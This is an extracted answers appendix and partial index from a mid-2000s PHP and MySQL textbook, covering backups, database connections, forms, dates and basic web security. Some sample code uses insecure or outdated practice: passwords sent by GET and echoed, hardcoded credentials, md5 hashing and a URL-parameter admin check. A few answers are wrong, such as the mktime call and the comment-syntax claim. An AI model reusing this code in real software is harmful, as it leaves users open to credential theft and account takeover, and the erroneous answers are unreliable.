 To back up a database called “blog” from the command line, execute:
  
 mysqldump -u root -p blog > my_backup.sql
  
 A password prompt appears before the backup begins.
  
 Solution to Question 8-2 
  
  
 To restore the “blog” backup file from the command line, execute:
  
 mysql -u root -p
  -D test
  < my_backup.sql
  
 A password prompt appears before the restore begins.
  
 Solution to Question 8-3 
  
  
 The advantages for creating an index are:
  
 • Queries with
  where
  clauses that match the index columns are much faster.
  
 • Verifying the uniqueness of an index value is much faster.
  
 Some disadvantages are:
  
 • Queries that insert or remove rows from an indexed table take longer for the 
  
 index to update.
  
 • Additional storage space is required to store the index.
  
 382
  
 |
  
 Appendix: Solutions to Chapter Questions",NA
Chapter 9,"Solution to Question 9-1 
  
  
 The database connection string is formatted as follows:
  
 mysql://
 db_username
 :
 db_password
 @
 db_host
 /
 db_database
 : 
  
 mysql://joe:my$ql@oreilly.com/survey
  
 Solution to Question 9-2 
  
 The database connection requires two steps when you are not using PEAR. First, 
 you must connect to the database. Once you have connected, the survey data-
 base is selected:
  
 <?php 
  
 //set the connection details 
  
 $db_host='oreilly.com'; 
  
 $db_database='survey'; 
  
 $db_username='joe'; 
  
 $db_password='my$ql'; 
  
 //call mysql_connect to connect 
  
 $connection = mysql_connect($db_host, $db_username, $db_password); 
  
 if (!$connection){ 
  
 die (""Could not connect to the database: <br />"". mysql_error( )); 
  
 } 
  
 //select the database using mysql_select_db 
  
 $db_select = mysql_select_db($db_database); 
  
 if (!$db_select){ 
  
 die (""Could not select the database: <br />"". mysql_error( )); 
  
 } 
  
 ?>
  
 Solution to Question 9-3 
  
  
 Add the following to the end of the code from Solution 9-2:
  
 <?php 
  
 $query = ""SELECT * FROM authors""; 
  
 $result = mysql_query( $query ); 
  
 if (!$result){    die (""Could not query the database: <br />"". mysql_error( )); } 
  
 while ($result_row = mysql_fetch_row(($result))){
  
  
  echo 'Author ID: '.$result_row[0] . '<br />';
  
  
  echo 'Title ID: '.$result_row[1] . '<br /> ';
  
  
  echo 'Author Name: '.$result_row[2] . '<br /><br />'; 
  
 } 
  
 //Close the connection 
  
 mysql_close($connection); 
  
 ?>
  
 Solution to Question 9-4 
  
 The PEAR functions are more compact, and they automate some of the manual 
 work of connecting to and selecting from the database. Because PEAR code is 
 used by many developers, it is less likely to have an error than to have code 
 that’s written from scratch.
  
 Chapter 9
  
 | 383",NA
Chapter 10,"Solution to Question 10-1 
  
 The super global variable
  $_SERVER['PHP_SELF']
  always returns the name of the 
 running PHP script. You can rename a script containing the global variable, and 
 your code automatically uses the new script name to process the results.
  
 Solution to Question 10-2 
  
 The code to create a username and password form that processes the values is 
 written as follows:
  
 <?php 
  
 echo ('<form action=""'.$_SERVER[""PHP_SELF""].'"" method=""GET"">'); 
  
 echo (' 
  
  
  
 <label>Username:<input type=""text"" name=""username"" size=""10"" maxlength=""30"" /> 
 </label>
  
  
  <br />
  
  
  <label>Password:<input type=""text"" name=""password"" size=""10"" maxlength=""30"" /> 
 </label>
  
  
  <input type=""submit"" value=""Submit"" />
  
  
  </form> 
  
 '); 
  
 ?>
  
 Solution to Question 10-3 
  
  
 In order to also display the username and password upon submission, 
 specify:
  
 <?php 
  
 //Get the username and password from the GET global array 
  
 $username = $_GET[""username""]; 
  
 $password = $_GET[""password""]; 
  
 //determine if this is after the form's been submitted 
  
 if (!empty($username)){
  
  //display the values from the submission
  
  echo (""Username: $username<br>"");
  
  echo (""Password: $password<br>""); 
  
 } 
  
 else { 
  
 //display the form 
  
 echo ('<form action=""'.$_SERVER[""PHP_SELF""].'"" method=""GET"">'); 
  
 echo ('
  
    
  <label>Username:<input type=""text"" name=""username"" size=""10"" 
  
 maxlength=""30"" /></label>
  
    
  <br />
  
    
  <label>Password:<input type=""text"" name=""password"" size=""10"" 
  
 maxlength=""30"" /></label>
  
    
  <input type=""submit"" value=""Submit"" />
  
    
  </form>
  
   
  '); 
  
 } 
  
 ?>
  
 Solution to Question 10-4 
  
  
 To select only author names starting with an “A,” use the following query:
  
 SELECT * FROM authors WHERE author LIKE 'A%'`
  
 384
  
 |
  
 Appendix: Solutions to Chapter Questions",NA
Chapter 11,"Solution to Question 11-1 
  
 The
  printf( )
  function prints to the output of your program, while
  sprintf( ) 
 returns its output as a string.
  
 Solution to Question 11-2 
  
  
 Check whether the date 1/31/2045 is valid as 
 follows:
  
 if (checkdate(1,31,2045)) {
  
  
  echo('Date is valid.'); 
  
 } 
  
 else {
  
  
  echo ('Invalid date.'); 
  
 }
  
 Solution to Question 11-3 
  
 To display the day of the week for 1/31/2045, you must first create a 
 timestamp for that date. The “l” in the format string for
  date( )
  indicates that the 
 full day of the week displays:
  
 <?php 
  
 $timestamp= mktime(1,31,2045); 
  
 echo date(""l"",$timestamp); 
  
 ?>
  
 Solution to Question 11-4 
  
  
 To rename the file
  upload.tmp
  to
  sample.jpg
 , 
 specify:
  
 <?php 
  
 $status=rename('upload.tmp','sample.jpg'); 
  
 if ($status) {
  
  
  echo (""Renamed file.""); 
  
 } 
  
 ?>",NA
Chapter 12,"Solution to Question 12-1 
  
  
 The elements
  <br/>
 ,
  <br />
 , and
  <br></br>
  are all acceptable XHTML format.
  
 Solution to Question 12-2 
  
 The document type is used when validating an XHTML page, while the MIME 
 type defines how your web browser interprets the content.
  
 Solution to Question 12-3 
  
 The MIME type
  application/xhtml+xml
  cannot be used exclusively because 
 Internet Explorer does not correctly interpret this MIME type.
  
 Solution to Question 12-4 
  
  
 PHP does not distinguish between XHTML and HTML output.
  
 Chapter 12
  
 | 385",NA
Chapter 13,"Solution to Question 13-1 
  
 To add the
  published_date
  column, use the connection and query code that are 
 employed throughout the chapter, but modify the query string to create the new 
 column:
  
 <?php 
  
 require_once('db_login.php'); 
  
 //sets the values for the database connection 
  
 require_once('DB.php'); 
  
 //connect to the database 
  
 $connection = DB::connect(""mysql://$db_username:$db_password@$db_host/$db_ 
  
 database""); 
  
 if (DB::isError($connection)){
  
  
  die (""Could not connect to the database: <br />"". DB:: 
  
 errorMessage($connection)); 
  
 } 
  
 //modify the table 
  
 $query = ""
 ALTER TABLE books ADD published_date date
 ""; 
  
 //check for an error 
  
 $result = $connection->query($query); 
  
 if (DB::isError($result)){
  
  
  die(""Could not query the database: <br />"". $query."" "".DB:: 
  
 errorMessage($result)); 
  
 } 
  
 echo ""Modified successfully!""; 
  
 $connection->disconnect( ); 
  
 ?>
  
 Solution to Question 13-2 
  
 SQL injection and cross-site scripting attacks. SQL Injection attacks attempt to 
 insert special characters that change the meaning of an SQL query, while Cross 
 Site Scripting attacks attempt to reveal private information from a session by 
 inserting malicious HTML.
  
 Solution to Question 13-3 
  
  
 The
  get_magic_quotes_gpc( )
  function returns
  TRUE
  if magic quotes are enabled.
  
 Solution to Question 13-4 
  
 The
  htmlentities( )
  function escapes any HTML that might otherwise be exploited.",NA
Chapter 14,"Solution to Question 14-1 
  
  
 Cookies are stored on the web user’s hard drive.
  
 Solution to Question 14-2 
  
  
 The
  md5( )
  function creates a one-way encoding of the 
 password.
  
 386
  
 |
  
 Appendix: Solutions to Chapter Questions",NA
Chapter 15,"Solution to Question 15-1 
  
 The
  .php
  extension causes the PHP interpreter to process the file instead of dis-
 playing its contents. Displaying the contents might reveal useful information for 
 breaching the security of your site, such as passwords or the inner workings of 
 your code.
  
 Solution to Question 15-2 
  
 The
  sha1( )
  function creates a 160-bit key instead of
  md5( )
 ’s 128-bit string. It 
 also uses a superior algorithm for making it difficult to determine the values 
 that generate a particular encoding.
  
 Solution to Question 15-3 
  
 If a malicious user knows that you’re storing the logged-in user’s ID in an auto-
 matic global variable, it’s easy for her to send in her own value for the user ID as 
 a URL parameter. She can then become any user.
  
 Solution to Question 15-4 
  
 Untrustworthy data, or data that a user can easily manipulate before it is 
 submit-ted to your program, includes:
  
 • Data from the
  $GET
  global array
  
 • Data from the
  $POST
  global array
  
 • Cookie data
  
 • Session data",NA
Chapter 16,"Solution to Question 16-1 
  
 JavaScript’s pros are that users get immediate feedback when entering data into 
 fields about that data’s validity, and the form doesn’t need to be redisplayed by 
 the PHP code.
  
 Chapter 16
  
 | 387",NA
Chapter 17,"Solution to Question 17-1 
  
 To change the blog name to “PHP and MySQL Zone,” modify
  config.php
  as 
 follows:
  
 <?php
  
  // put full path to Smarty.class.php
  
  require('/usr/share/php/Smarty/Smarty.class.php');
  
  $smarty = new Smarty( );
  
  $smarty->template_dir = '/home/www/htmlkb/smarty/templates';
  
  $smarty->compile_dir = '/home/www/htmlkb/smarty/templates_c';
  
  $smarty->cache_dir = '/home/www/htmlkb/smarty/cache';
  
  $smarty->config_dir = '/home/www/htmlkb/smarty/configs';
  
  $blog_title=""PHP and MySQL Zone""; 
  
 ?>
  
 Solution to Question 17-2 
  
  
 From the MySQL client, execute the SQL query:
  
 insert into categories values (NULL, 'Bugs');
  
 You can also add the row using
  phpMyAdmin
 . Because the drop-down category 
 list is created dynamically, this is the only change required to add a new 
 category.
  
 388
  
 |
  
 Appendix: Solutions to Chapter Questions",NA
Chapter 18,"Solution to Question 18-1 
  
 Some PHP interpreters may not be configured to execute PHP code that starts 
 with
  <?
 . It can also cause problems with XML parsing.
  
 Solution to Question 18-2 
  
 The
  //
  comment style comments out the current line only, while
  /*
  comments 
 out lines until a matching
  /*
  comment is encountered.
  
 Solution to Question 18-3 
  
 If you are using
  include_once( )
  and an include file is accidentally included more 
 than once, a function redefinition error will not occur. This can easily happen 
 when included files contain their own include lines.
  
 Solution to Question 18-4 
  
 The code should follow the coding conventions to make it easy to read and 
 portable:
  
 <?php 
  
 /*
  
  * this file welcomes the user.
  
  * this file welcomes the user and uses proper code styles.
  
  *
  
  * Copyright 2006 (c) O'Reilly Media, Inc.
  
  *
  
  * @version   $Id: coding_standards_example.html,v 1.2 2006/1/19 24:49:50
  
  *
  
  */ 
  
 //verify the user 
  
 if ($_GET[user_id] == 'Admin') 
  
 {
  
  //Welcome the admin user to the control panel.
  
  echo ('Welcome to the control panel.'); 
  
 } 
  
 else 
  
 {
  
  //Welcome other user.
  
  echo ('Welcome.'); 
  
 } 
  
 ?>
  
 Chapter 18
  
 | 389",NA
Index,NA,NA
Symbols,"& (ampersand) 
  
  
 && (logical AND) operator, 68, 71 
  
 bitwise AND operator, 68 
  
  
 reference operator, setting a variable 
  
  
 reference, 105 
  
  
 reference parameters, 91 
  
 < > (angle brackets) 
  
  
 < (less than) operator, 53, 68, 70 
  
  
 < > (not equal) operator, 53 
  
  
 << (bitwise shift left) operator, 68 
  
  
 <= (less than or equal to) operator, 
 54, 
  
  
 68, 70 
  
  
 > (greater than) operator, 54, 68, 70 
  
 > 
 (redirection) operator, 156 
  
  
 >= (greater than or equal to) 
  
  
  
 operator, 54, 68, 70 
  
  
 >> (bitwise shift right) operator, 68 
  
 enclosing HTML tags, 11 
  
  
 PHP tags (<?php ?>), 368 
  
 * (asterisk) 
  
  
 multiplication assignment (*=) 
  
  
  
 operator, 58 
  
  
 multiplication operator, 57, 68 
  
  
 zero or more matches in regular 
  
  
  
 expressions, 331 
  
 @ (at sign), error control operator, 68 
  
 suppressing information about the 
  
  
  
 database, 320 
  
 ~ (bitwise NOT) operator, 68
  
 \ (backslash), escaping quotes in strings, 
 52 ^ (caret) 
  
  
 beginning-of-line matching in regular 
  
  
 expressions, 331 
  
  
 bitwise NOR operator, 68 
  
  
 negating character classes in regular 
  
  
  
 expressions, 332 
  
 : (colon) 
  
  
 :: (scope resolution) operator, 104 
  
  
 separating expressions in ? operator, 74 
 , (comma) CSV data format, 158 
  
 { } (curly braces) 
  
  
 arrays referenced in string having 
  
  
  
 whitespace or punctuation in key 
  
  
 value, 111 
  
  
 enclosing statements in PHP, 73, 370 $ 
 (dollar sign) 
  
  
 beginning PHP variables, 43 
  
  
 end-of-line matching in regular 
  
  
  
 expressions, 331 
  
 = (equals sign) 
  
  
 == (equality) operator, 53, 68, 69 
  
  
 === (identity) operator, 53, 68, 70 
  
  
 assignment operator, 44, 68, 69 
  
 ! (exclamation mark) 
  
  
 != (inequality) operator, 68, 70 
  
  
 != (not equal) operator, 53 
  
  
 !== (nonidentity) operator, 68 
  
  
 logical NOT operator, 68 
  
 # (hash sign), in HTML and PHP 
  
  
  
 comments, 24
  
 We’d like to hear your suggestions for improving our indexes. Send email to
  index@oreilly.com
 .
  
 391",NA
Numbers,"1NF (First Normal Form), 150 
 2NF (Second Normal Form), 152 
 3NF (Third Normal Form), 153",NA
A,"abbreviations, 369 
  
 abstraction, 179 
  
  
 PDO database abstraction layer, 372 
 $action variable, 355 
  
 action keyword, 199 
  
 Active Server Pages (ASP), 4 
  
 ADD column command, 137 
  
 addition (+) operator, 57 
  
 addition assignment (+=) operator, 58 
 addition, date and time arithmetic, 172 
 addslashes function, 322 
  
 AFTER keyword, 137 
  
 Ajax, 373 
  
 aliases for tables included in database 
  
  
  
 query, 142 
  
 ALTER TABLE command, 136 
  
 anchors (regular expression), 331 
  
 AND (logical AND) operator, 68, 70 
 angle brackets (see < >, under Symbols) 
 answers to chapter questions, 377–389 
 Apache, 5 
  
  
 authentication, 288 
  
  
  
 access control for administrative 
  
  
  
 scripts, 308 
  
  
 installing, 16–20 
  
  
  
 default index page after 
  
  
  
  
 installation, 20 
  
  
  
 default installation directory, 18
  
 392
  
 |
  
 Index",NA
B,"\B (nonword boundary) in regular 
  
  
  
  
 expressions, 331 
  
 \b (word boundary) in regular 
  
  
  
  
 expressions, 331 
  
 <b>, <tt>, and <i> elements, no longer 
  
  
  
  
 supported in XHTML 2.0, 255 
 backing up database data, 155–159 
  
  
 best practices, 159 
  
  
 copying database files, 156 
  
  
 mysqldump command, 156–158 
  
  
  
 store database backup (example), 156 
 binary number, outputting with printf, 224 
 binary operators, 65 
  
  
 restrictions on lefthand operand, 66 
  
 bitwise NOT operator (~), 68
  
  
 Index
  
 | 393",NA
C,"CakePHP, 372 
  
 capitalize function (example), 90 
  
  
 default parameter, $each, 90 
  
  
 modifying to take a reference 
  
  
  
 parameter, 91 
  
 Cartesian product, 138 
  
 Cascading Style Sheets (see CSS) 
  
 case 
  
  
 case-insensitive searches in MySQL, 143 
  
 case-insensitivity, PHP function 
  
  
  
 names, 87 
  
  
 case-sensitivity in PHP variables, 44 
  
  
 changing for strings with PHP 
  
  
  
 functions, 231 
  
  
 in regular expression pattern 
  
  
  
 matching, 332 
  
  
 in string comparisons, 53 
  
 casting 
  
  
 converting data types, 65 
  
  
 PHP cast operators, listed, 68 
  
  
 variables, 66 
  
 categories table (blog example), 344 
  
 CGI (Common Gateway Interface), 1 
  
 chapter questions, answers to, 377–389 
 character classes (regular expression), 332 
 checkboxes (form), 204 
  
  
 using same name to store multiple 
  
  
  
 values, 208–210 
  
  
 validating user input from, 210 
  
 checkdate function, 236 
  
 class scope, 99
  
  
 displaying from selected tables in 
  
  
  
  
 MySQL, 138 
  
  
 indexes using more than one column, 
 161 
  
 referencing as TABLE.COLUMN in 
  
  
  
  
 MySQL, 140 
  
  
 removing in MySQL, 138 
  
  
 renaming in MySQL, 137 
  
  
 result row columns, 186 
  
 combined assignment operators, 58 
  
 command line, accessing MySQL, 123–125 
  
 commands available at MySQL 
  
  
  
  
 prompt, 124 
  
  
 MySQL prompts, 124 
  
 comma-separated values (CSV) format, 158 
 $comment_count variable, 350 
  
 comments 
  
  
 // for single-line and /* ... */ for multiline 
  
  
  
 comments, 42 
  
  
 HTML and PHP, 24 
  
  
 PHP, 41, 366 
  
  
  
 file comments, 367 
  
  
  
 function comments, 367 
  
 comments (blog example), adding and 
  
  
  
  
 changing, 358–364 
  
 comments table (blog example), 344 
  
 commit command, 177 
  
 Common Gateway Interface (CGI), 1 
  
 compact function, 118 
  
 comparison operators, 53 
  
  
 listed, with precedence level, operands, 
  
  
  
 and associativity, 68 
  
  
 testing the relationship between two 
  
  
  
  
 values, 70
  
 394
  
 |
  
 Index",NA
D,"\D (nondigit character) in regular 
  
  
  
  
 expressions, 331 
  
 \d (digit character) in regular 
  
  
  
  
 expressions, 331 
  
 data structures (in databases), 131 
  
 data types 
  
  
 changing for column in MySQL 
  
  
  
  
 database, 136 
  
  
 column, 154–155 
  
  
  
 common MySQL types, 154 
  
  
 dates and times, used in database 
  
  
  
  
 functions, 172 
  
  
 defined, 154 
  
  
 operands, 65 
  
  
 variables, 45 
  
  
  
 converting to required type, 45 
  
 database abstraction 
  
  
 PDO, 372 
  
  
 PEAR DB classes, 179 
  
 database commands (MySQL), 124 
  
 database engines, 6 
  
 database functions, 164–178 
  
  
 date and time functions, 170–177 
  
  
  
 date and time arithmetic, 172–175 
  
  
 days, weeks, months, and 
  
  
  
  
 years, 170–172 
  
  
  
 formatting dates for display, 175–176 
  
  
 hours, minutes, and seconds, 172 
  
  
 Unix timestamp conversion, 176 
  
  
 PHP, 179 
  
  
 string functions, 164–169 
  
  
  
 CONCAT, 165 
  
  
  
 CONCAT_WS, 165 
  
  
  
 cutting strings into substrings, 168
  
  
 Index
  
 | 395",NA
E,"each( ) function, 115 
  
 echo function, 86 
  
 echo( ) function, 40 
  
 elements 
  
  
 acting as hyperlinks, XHTML 2.0, 255 
  
 array, 107 
  
  
  
 counting, 112 
  
  
  
 scalar values, 108 
  
  
 HTML, 11 
  
 else statement, 73 
  
 email address, regular expression 
  
  
  
  
 describing, 330 
  
 ENCLOSED BY char, 159 
  
 encoding passwords, 311 
  
 encrypting passwords, 311 
  
 endswitch, using to end switch statement, 
 77 enterprise databases, 7 
  
 equality (==) operator, 53, 68, 69 
  
 ereg-style regular expressions, 329 
  
 error control operator (@), 320 
  
 error levels, 337 
  
 error logging (PHP), 336 
  
 error_log parameter, 337 
  
 error_reporting parameter, 337 
  
 errorMessage function, 196 
  
 errors 
  
  
 common pitfalls in XHTML code, 258 
  
 connection to database, 184 
  
  
 database, handling from PHP, 265 
  
  
 displaying from PHP and redisplaying 
  
  
  
  
 form, 333–336 
  
  
 generating using switch and DEFAULT: 
  
  
  
 statements, 76 
  
  
 inhibiting (@ operator), 68 
  
  
 PEAR error reporting, 196 
  
 escaped characters, 51 
  
 escapeshellcmd function, 249 
  
 escapeSimple function (PEAR), 274 
  
 escaping user input, 319, 322
  
  
 combining with operators into 
 more 
  
  
 complex expressions, 
 63 
  
  
 defined, 62 
  
  
 formatting in PHP, 368 
  
  
 literals and variables, 62 
  
  
 valid expressions (examples), 62 
 extends operator, 101 
  
 extensions, loading into Apache, 5 
  
 extract function, 117 
  
  
 EXTR_PREFIX_ALL option, 118",NA
F,"feet-to-meters converter (in PHP), 212 
  
 Fetch (FTP client), 36 
  
 fetchRow function, 196 
  
 file comments (PHP), 367 
  
 file manipulation functions, PHP, 238–248 
  
 checking permissions, 239 
  
  
 creating files, 240 
  
  
 deleting files with unlink command, 241 
  
 file_exists function, 239 
  
  
 rename function, 242 
  
  
 uploading files, 243–248 
  
  
  
 accessing the file, 244 
  
  
  
 is_uploaded_file function, 244 
  
  
  
 move_uploaded_file function, 246 
  
  
 validation, 244–248 
  
  
 URL wrappers, 242 
  
 file_exists function, using with touch and 
  
  
  
 unlink commands, 241 
  
 file_get_contents function, 242 
  
 $_FILES global array, 244 
  
 files 
  
  
 include files, 310 
  
  
 including and requiring PHP files, 370 
  
 verifying integrity of with md5 
  
  
  
  
 function, 88 
  
 Fink, downloading and installing, 33 
  
 firewall setup utilities, 321 
  
 FIRST keyword, 137
  
  
 Index
  
 | 397",NA
G,"garbage collection, 299 
  
  
 PHP .ini variables for, 300 
  
 GET operations, data from, 318 
  
 get_magic_quotes_gpc function, 323 
 global variables, 46 
  
  
 automatic, security risks, 312–
 316 
  
 naming, 369 
  
  
 super globals, 49
  
 398
  
 |
  
 Index",NA
H,"hashcheck function, 87 
  
 heading element <h> in XHTML 2.0, 255 
 Hello world! program (example), 86 
  
 hidden form elements, 206 
  
 HOUR function, 172 
  
 .htaccess file, 300 
  
  
 securing directories containing 
  
  
  
  
 administrative scripts, 308 
  
 HTML 
  
  
 CSS, controlling appearance of pages, 10 
  
 directory.html file, 12 
  
  
 markup, 11 
  
  
 PHP and, 39–43 
  
  
  
 text output, 39–43 
  
  
 PHP templates and, 7 
  
  
 separating from PHP processing 
  
  
  
  
 code, 218 
  
 HTML forms (see forms) 
  
 htmlentities function, 274 
  
  
 escaping special characters, 319 
  
 htpasswd command, 309 
  
 HTTP, 1 
  
  
 default port, 18 
  
  
 TCP/IP, 2 
  
 HTTP authentication, 288–294 
  
  
 storing login information in a 
  
  
  
  
 database, 290–292 
  
  
 using with a PHP script, 289 
  
  
 validating username and password, 290 
  
 verifying login information against 
  
  
  
  
 database, 292 
  
 $HTTP_POST_FILES array, 244 
  
 hyperlinks (see links)",NA
I,"<i>, <b>, and <tt> elements, no longer 
  
 supported in XHTML 2.0, 255 
 IDE (Integrated Development
  
 img elements in XHTML 2.0, 255 
  
 implicit casting, 65 
  
 importing data from another database, 159 
 include files, 310 
  
 include function 
  
  
 handling of missing files, 310 
  
 include statement, 92 
  
  
 problems with, 94 
  
 include_once statement, 93 
  
  
 problems with, 94 
  
 include_path function, 242 
  
 including files, 370 
  
 increment operator (++), 68 
  
 incrementing/decrementing 
  
  
 autoincrement and autodecrement, 59 
  
 preincrement -decrement, 59 
  
 indenting (PHP code), 368 
  
 index files (PHP), mapping on Mac OS X 
  
  
  
 10.2 to DirectoryIndex, 26 
  
 indexes 
  
  
 array, 107 
  
  
  
 numeric indexed arrays, 107 
  
  
  
 query results, 187 
  
  
  
 specifying, 109 
  
  
  
 supplied by PHP, 109 
  
  
 database, 159–163 
  
  
  
 EXPLAIN command, 162 
  
  
  
 multicolumn indexes, 161 
  
  
  
 when to use, 160 
  
  
  
 where to specify, 160 
  
  
 MySQL database, 134 
  
 infinite loops, 78 
  
 information from many sources, 
  
  
  
  
 integrating, 7–11 
  
  
 CSS (Cascading Style Sheets), 10 
  
  
 PHP templates, 8 
  
 inheritance in OOP, 101–104 
  
 ini_set function, 319 
  
 initializing variables for improved 
  
  
  
  
 security, 316
  
 Environment), 116
  
 Index
  
 | 399",NA
J,"JavaScript 
  
  
 in Ajax, 373 
  
  
 code in cross-site scripting attack, 
 321 
  
 validating user data, 325–329 
  
  
  
 regular expressions, 326 
  
 joins 
  
  
 JOIN ON keyword, 142 
  
  
 LEFT JOIN ON clause, using with 
  
  
  
 SELECT, 163",NA
L,"LCASE and UCASE functions, 166 
  
 leading spaces or characters, trimming from 
  
  
 strings, 167 
  
 LEFT function, 168 
  
 LEFT JOIN ON clause, 163 
  
 LENGTH function, 166 
  
 length of a string (strlen), 230 
  
 Lerdorf, Rasmus, 4 
  
 less than (<) operator, 53 
  
 less than or equal to (<=) operator, 54 
  
 LIKE keyword, 143 
  
 links 
  
  
 deleting current row in a database, 277 
  
 displaying database query results with 
  
  
 embedded links, 267–270 
  
  
 elements in XHTML 2.0, 255 
  
 Linux 
  
  
 installing Apache, PHP, and MySQL, 16 
  
 MySQL datafiles directory, 156 
  
  
 phpMyAdmin configuration file, 126 
 literals, 62 
  
  
 regular expression, 330 
  
 LOCATE function, 168 
  
 logical AND operator, 68 
  
 logical NOT operator (!), 68 
  
 logical operators, 70 
  
  
 logical statements and their results, 71 
  
 using in WHERE clause, 140, 144 
  
 logical OR operator, 68 
  
 logical XOR operator, 68 
  
 logically grouping related data, 150 
  
 login settings for MySQL, 181 
  
 login systems, use of session variables, 297 
 login.php file, 13 
  
 loops, 77–83 
  
  
 breaking out of, 81 
  
  
 continue statements, using, 82 
  
  
 do ... while, 79 
  
  
 for loops, 80 
  
  
 infinite, 78 
  
  
 iterations, 77 
  
  
 looping through array items and 
  
  
  
 referencing array values, 111 
  
  
 while loops, 78 
  
 LPAD and RPAD functions, 166 
  
 LTRIM and RTRIM functions, 167
  
 400
  
 |
  
 Index",NA
M,"Mac OS X 
  
  
 accessing MySQL with command 
  
  
  
  
 line, 123 
  
  
 Apache, 16 
  
  
 enabling PHP, 25 
  
  
 MySQL datafiles directory, 156 
  
  
 MySQL installation, 33 
  
 magic quotes, 322 
  
  
 checking whether it’s enabled, 323 
  
  
 escaping user input, 273 
  
 many-to-many relationships (database), 
 148 math, 57–60 
  
  
 autoincrement and autodecrement, 59 
  
 basic operators, 57 
  
  
 combined assignment operations, 58 
  
 preincrement and -decrement, 59 
  
 mathematical operations, 57 
  
 mathematical operators, types of 
  
  
  
  
 operands, 65 
  
 MAX clause, using an index, 160 
  
 MAXLENGTH attribute, setting in form text 
  
  
  
 fields, 326 
  
 md5 function, 87 
  
 md5 one-way encrypt function, 311 
  
 MDB2 (PEAR database interface), 196 
  
 message digest, 87 
  
 metacharacters (regular expression), 330 
  
 quantifiers, 331 
  
 method keyword, 199 
  
 methods, 96, 97 
  
  
 static, 104 
  
 Microsoft 
  
  
 Active Server Pages (ASP), 4 
  
  
 Windows (see Windows) 
  
 MIME type, setting for XHTML 
  
  
  
  
 documents, 262 
  
 MIN clause, using an index, 160 
  
 minimized attributes (HTML), 260 
  
 MINUTE function, 172 
  
 mirrors (download locations), 16 
  
 mktime function, 237 
  
 MODIFY command, 137 
  
 modules 
  
  
 Apache, 5 
  
  
  
 online source, 5 
  
  
 PEAR, categories of, 190 
  
  
 PHP, uncommenting line that loads on 
  
  
  
 Mac OS X, 26 
  
 modulo (%) operator, 57 
  
 MONTH function, 171
  
 MONTHNAME function, 171 
  
 move_uploaded_file function, 246 
  
 multicolumn indexes, 161 
  
 multidimensional arrays, 114–116 
  
  
 creating, 115 
  
  
 displaying, 115 
  
 multiline comments, 42 
  
 multiplication (*) operator, 57 
  
 multiplication assignment (*=) operator, 58 
 MySQL, 122–145 
  
  
 accessing the database with the 
 command 
  
  
  
 line, 123–
 125 
  
  
  
 commands available at MySQL 
  
  
  
  
 prompt, 124 
  
  
  
 MySQL prompts, 124 
  
  
 administering with 
  
  
  
  
 phpMyAdmin, 126–129 
  
  
 common data types, 154 
  
  
 connecting to database from PHP, 180 
  
 connecting to the database, 122 
  
  
 data types, online listing of types, 155 
  
 database concepts, 131–132 
  
  
 database engines, 6 
  
  
 database objects, changing from 
  
  
  
  
 PHP, 263–265 
  
  
  
 creating a table, 263–265 
  
  
  
 dropping a table, 265 
  
  
  
 handling errors, 265 
  
  
 development history, 6 
  
  
  
 major releases and features, 6 
  
  
 functions, using, 164–178 
  
  
 installing, 27–33 
  
  
  
 Mac OS X installation, 33 
  
  
  
 on Linux, 16 
  
  
  
 PHP Connector, 32 
  
  
 managing the database, 125 
  
  
  
 creating a database, 126 
  
  
  
 creating users, 125 
  
  
 manipulating data from PHP, 266 
  
  
  
 deleting data, 277–281 
  
  
  
 displaying results with embedded 
  
  
  
  
 links, 267–270 
  
  
  
 form to add data to a table, 270–276 
  
  
 performing a subquery, 282–284 
  
  
  
 updating data, 276 
  
  
 place in web development, 2 
  
  
 preventing access to the database, 320 
  
  
 for external hosts, 321 
  
  
 relational database, 146 
  
  
 separate database users for each 
  
  
  
  
 application, 321
  
  
 Index
  
 | 401",NA
N,"\n (newline character) in 
 regular 
  
 expressions, 331 
  
 namespaces, XML, 254 
  
 naming guidelines, 369",NA
O,"object-oriented programming 
  
  
  
 (OOP), 96–105 
  
  
 classes, 96 
  
  
 creating a class, 96 
  
  
 creating a class instance, 97 
  
  
 inheritance, 101–104 
  
  
 methods and constructors, 97 
  
  
 static methods and variables, 104 
  
  
 variable references, 105 
  
  
 variable scope within classes, 99 
  
 objects, 369 
  
  
 creating a new object and assigning it to 
 a 
   
 variable, 99 
  
  
 in object-oriented programming, 96 
  
 off-by-one error (array indexes), 107 
  
 one-to-many relationships (database), 148 
 one-to-one relationships (database), 147 
 online resources for dynamic web 
  
  
  
 development, xi 
  
 OOP (see object-oriented programming) 
 open source, value of, 3
  
 402
  
 |
  
 Index",NA
P,"padding strings, 166 
  
  
 printf function (PHP), 226–228 
 parameters (constructor methods), 98 
 parameters (function), 86, 89 
  
  
 default values in, 90 
  
  
 parameter references, 91
  
  
  
 displaying, 346–348 
  
 changing database objects from, 263–
 265 
  
 creating a table, 263–265 
  
  
 dropping a table, 265 
  
  
 handling errors, 265 
  
 code building blocks, 43–60 
  
  
 concatenation, 54 
  
  
 constants, 55–56
  
  
 Index
  
 | 403",NA
Q,"quantifiers (regular expression), 331 
  
 query function, 195 
  
 querying the database 
  
  
 basic steps in process, 180 
  
  
 building SQL SELECT query, 185 
  
  
 closing the connection, 187 
  
  
 connecting to MySQL database, resources 
  
  
 for, 180 
  
  
 fetching and displaying results, 186 
  
  
 having database execute the query, 186 
  
 PEAR functions, using, 190–197 
  
  
 PHP functions, using, 180–190 
  
  
 putting it all together (example), 187–190 
  
 unions, 6 
  
  
 using form data, 215–217 
  
 quotation marks 
  
  
 in data for MySQL database tables, 135 
  
 magic quotes (see magic quotes) 
  
  
 in strings, 51",NA
R,"\r (carriage return) in regular 
  
  
  
 expressions, 331 
  
 radio buttons (form), 205 
  
  
 setting up, 210 
  
  
 validating user input from, 210 
  
 RDBMS (Relational Database Management 
  
  
 System), 6 
  
 realm for HTTP authentication, setting, 303 
 records (database), 132 
  
 redirection operator (>), 156 
  
 reference operator (&), 105 
  
 reference parameters, 91 
  
 references, variable, 105 
  
 register_globals setting, 312 
  
  
 reading session variables from, 314 
  
 regular expressions, 326, 329–333 
  
  
 anchors, 331 
  
  
 character classes, 332 
  
  
 ereg, 329 
  
  
 executing in PHP, 332 
  
  
 literals, 330 
  
  
 metacharacters, 330 
  
  
 Perl format, 332 
  
  
 Perl-compatible, 329 
  
  
 quantifiers, 331 
  
  
 syntax (example), 330 
  
 Relational Database Management System
  
 (RDBMS), 6
  
 Index
  
 | 405",NA
S,"\S (nonwhitespace character) in 
 regular 
   
 expressions, 332 
  
 \s (whitespace character) in regular 
  
  
  
 expressions, 331 
  
 scalar values, 108 
  
 scheduling, 6 
  
 schema (database), 6 
  
